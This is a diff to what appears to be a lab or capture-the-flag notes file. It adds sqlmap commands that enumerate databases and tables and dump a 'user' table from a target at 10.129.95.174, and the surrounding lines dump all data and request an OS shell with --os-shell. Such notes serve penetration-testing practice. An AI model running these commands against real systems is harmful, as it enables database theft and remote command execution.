@@ -26,6 +26,15 @@ sqlmap --url http://10.129.95.174/dashboard.php?search= --cookie="PHPSESSID=sess
 # dump data
 sqlmap --url http://10.129.95.174/dashboard.php?search= --cookie="PHPSESSID=sessioncookie" --all
 
+# Enumerate the database and tables to identify any sensitive information stored in the database.
+sqlmap -r login.req --dbs
+
+# Enumerate the database named main by extracting the table names.
+sqlmap -r login.req -D main --tables
+
+# Extract all the data from the user table.
+sqlmap -r login.req -D main -T user --dump
+
 # try to get command execution
 sqlmap --url http://10.129.95.174/dashboard.php?search= --cookie="PHPSESSID=sessioncookie" --os-shell
 ```
